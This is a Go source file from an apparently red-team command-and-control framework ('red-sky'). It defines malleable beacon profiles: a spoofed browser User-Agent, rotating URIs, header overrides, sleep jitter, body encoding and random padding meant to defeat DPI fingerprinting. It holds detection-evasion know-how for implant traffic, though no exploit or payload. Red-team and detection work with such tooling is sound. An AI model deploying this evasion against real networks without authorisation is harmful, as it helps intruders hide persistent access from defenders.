// Package c2profile defines the malleable C2 profile format for red-sky.
//
// A profile is a JSON file that controls every wire-visible property of
// a beacon's traffic: User-Agent, request URIs, extra headers, sleep
// interval, jitter, and body padding. The agent and the core each load
// the same profile file at startup, so both sides agree on the shape
// without any hidden defaults.
//
// This is the piece sliver and CS both ship and red-sky did not. The
// profile is the whole malleability layer: nothing observable in the
// agent's HTTP traffic needs to be hardcoded anywhere in the source.
package c2profile

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// DefaultUserAgent is used when a profile omits useragent. Chrome on
// Windows 11 — the most common shape on the wire.
const DefaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

// DefaultSleepMS is the fallback beacon interval — 60s with 20% jitter.
const DefaultSleepMS = 60000

// DefaultJitterPct is the fallback jitter, 0..100.
const DefaultJitterPct = 20

// Profile is the full malleable C2 configuration. Every field is
// optional; missing fields are filled from the defaults in Apply().
type Profile struct {
	// Name is the operator-chosen label. Shown in logs and in the core
	// session pane. Not used on the wire.
	Name string `json:"name"`

	// UserAgent is the User-Agent header the agent sends. Defaults to
	// DefaultUserAgent.
	UserAgent string `json:"useragent,omitempty"`

	// URIs are the request paths the agent POSTs to. The special token
	// {id} is replaced with the agent's ID at request time. The agent
	// rotates URIs on each beacon. Empty means "/" is used.
	URIs []string `json:"uris,omitempty"`

	// Headers is a map of extra request headers to add. Values support
	// {id} substitution. Host header override happens here.
	Headers map[string]string `json:"headers,omitempty"`

	// SleepMS is the beacon interval in milliseconds. JitterPct is the
	// +/- percent applied per cycle.
	SleepMS   int `json:"sleep_ms,omitempty"`
	JitterPct int `json:"jitter_pct,omitempty"`

	// PaddingMin / PaddingMax pad the request body with random base64
	// bytes to defeat body-fingerprinting DPI. Zero means no padding.
	PaddingMin int `json:"padding_min,omitempty"`
	PaddingMax int `json:"padding_max,omitempty"`

	// BodyEncoding is "none", "base64", or "hex". Applied to the
	// envelope payload before send. "none" means raw JSON. The server
	// expects the inverse.
	BodyEncoding string `json:"body_encoding,omitempty"`

	// sourcePath is where the profile was loaded from, for diagnostics.
	sourcePath string
}

// Load reads a profile from disk, applies defaults, validates, and
// returns it. A missing file is an error — the operator named it on
// the command line. A syntactically-bad file is an error with the
// parse failure. Validation runs after defaults so partial profiles
// (e.g., just {"useragent": "..."}) work.
func Load(path string) (*Profile, error) {
	if path == "" {
		return nil, errors.New("c2profile: empty path")
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		return nil, fmt.Errorf("c2profile: resolve %q: %w", path, err)
	}
	data, err := os.ReadFile(abs)
	if err != nil {
		return nil, fmt.Errorf("c2profile: read %q: %w", abs, err)
	}
	var p Profile
	if err := json.Unmarshal(data, &p); err != nil {
		return nil, fmt.Errorf("c2profile: parse %q: %w", abs, err)
	}
	p.sourcePath = abs
	p.Apply()
	if err := p.Validate(); err != nil {
		return nil, fmt.Errorf("c2profile: %q: %w", abs, err)
	}
	return &p, nil
}

// Apply fills defaults for any missing field. Called automatically by
// Load; exposed so tests can exercise the defaults without disk I/O.
func (p *Profile) Apply() {
	if p.UserAgent == "" {
		p.UserAgent = DefaultUserAgent
	}
	if p.SleepMS <= 0 {
		p.SleepMS = DefaultSleepMS
	}
	if p.JitterPct < 0 {
		p.JitterPct = 0
	}
	if p.JitterPct > 100 {
		p.JitterPct = 100
	}
	if p.JitterPct == 0 && p.SleepMS == DefaultSleepMS {
		// Only default the jitter when sleep is also default — explicit
		// sleep=0 jitter means "no jitter", respect it.
		p.JitterPct = DefaultJitterPct
	}
	if len(p.URIs) == 0 {
		p.URIs = []string{"/"}
	}
	if p.PaddingMax > 0 && p.PaddingMin > p.PaddingMax {
		p.PaddingMin, p.PaddingMax = p.PaddingMax, p.PaddingMin
	}
	if p.BodyEncoding == "" {
		p.BodyEncoding = "none"
	}
	p.BodyEncoding = strings.ToLower(p.BodyEncoding)
}

// Validate returns an error if the profile is internally inconsistent.
// Called after Apply so defaults are already in place.
func (p *Profile) Validate() error {
	if p.SleepMS <= 0 {
		return errors.New("sleep_ms must be positive")
	}
	if p.JitterPct < 0 || p.JitterPct > 100 {
		return errors.New("jitter_pct must be 0..100")
	}
	switch p.BodyEncoding {
	case "none", "base64", "hex":
	default:
		return fmt.Errorf("body_encoding %q: expected none, base64, or hex", p.BodyEncoding)
	}
	for _, u := range p.URIs {
		if u == "" {
			return errors.New("empty uri in uris")
		}
		if !strings.HasPrefix(u, "/") {
			return fmt.Errorf("uri %q: must start with /", u)
		}
	}
	return nil
}

// Source returns the absolute path the profile was loaded from. Empty
// for profiles created in-memory (tests).
func (p *Profile) Source() string { return p.sourcePath }

// RenderURI substitutes {id} in uri with the given agent id. If uri has
// no {id} token, returns uri unchanged.
func RenderURI(uri, id string) string {
	if id == "" {
		return uri
	}
	return strings.ReplaceAll(uri, "{id}", id)
}

// EncodeBody applies the profile's body_encoding to raw payload bytes.
// "none" returns the bytes unmodified.
func (p *Profile) EncodeBody(raw []byte) ([]byte, error) {
	switch p.BodyEncoding {
	case "none", "":
		return raw, nil
	case "base64":
		out := make([]byte, base64.StdEncoding.EncodedLen(len(raw)))
		base64.StdEncoding.Encode(out, raw)
		return out, nil
	case "hex":
		out := make([]byte, hex.EncodedLen(len(raw)))
		hex.Encode(out, raw)
		return out, nil
	}
	return nil, fmt.Errorf("body_encoding %q: unknown", p.BodyEncoding)
}

// DecodeBody is the inverse of EncodeBody. Used by the core.
func (p *Profile) DecodeBody(enc []byte) ([]byte, error) {
	switch p.BodyEncoding {
	case "none", "":
		return enc, nil
	case "base64":
		out := make([]byte, base64.StdEncoding.DecodedLen(len(enc)))
		n, err := base64.StdEncoding.Decode(out, enc)
		if err != nil {
			return nil, fmt.Errorf("base64 decode: %w", err)
		}
		return out[:n], nil
	case "hex":
		out := make([]byte, hex.DecodedLen(len(enc)))
		n, err := hex.Decode(out, enc)
		if err != nil {
			return nil, fmt.Errorf("hex decode: %w", err)
		}
		return out[:n], nil
	}
	return nil, fmt.Errorf("body_encoding %q: unknown", p.BodyEncoding)
}

// PadBody adds random base64 bytes to the end of raw, between
// PaddingMin and PaddingMax. The padding is separated from the real
// payload by a single "|" so the server can strip it. Returns raw
// unmodified if PaddingMax is 0.
func (p *Profile) PadBody(raw []byte) []byte {
	if p.PaddingMax <= 0 {
		return raw
	}
	span := p.PaddingMax - p.PaddingMin
	if span < 0 {
		span = 0
	}
	n := p.PaddingMin
	if span > 0 {
		var b [2]byte
		if _, err := rand.Read(b[:]); err == nil {
			n += int(b[0]) % (span + 1)
		}
	}
	if n == 0 {
		return raw
	}
	pad := make([]byte, n)
	if _, err := rand.Read(pad); err != nil {
		return raw
	}
	enc := make([]byte, base64.StdEncoding.EncodedLen(n))
	base64.StdEncoding.Encode(enc, pad)
	out := make([]byte, 0, len(raw)+1+len(enc))
	out = append(out, raw...)
	out = append(out, '|')
	out = append(out, enc...)
	return out
}

// StripPadding removes the "|" + padding suffix added by PadBody. If no
// separator is present (a profile with no padding), returns enc unchanged.
func StripPadding(enc []byte) []byte {
	i := -1
	for j := len(enc) - 1; j >= 0; j-- {
		if enc[j] == '|' {
			i = j
			break
		}
	}
	if i < 0 {
		return enc
	}
	return enc[:i]
}

// SleepJitter returns the actual sleep duration for one beacon cycle,
// applying the profile's jitter. Jitter is uniform in
// [-JitterPct, +JitterPct] of SleepMS.
func (p *Profile) SleepJitterMS() int {
	if p.JitterPct == 0 {
		return p.SleepMS
	}
	var b [2]byte
	if _, err := rand.Read(b[:]); err != nil {
		return p.SleepMS
	}
	span := p.SleepMS * p.JitterPct / 100
	if span == 0 {
		return p.SleepMS
	}
	delta := int(b[0])%(2*span+1) - span
	ms := p.SleepMS + delta
	if ms < 100 {
		ms = 100
	}
	return ms
}
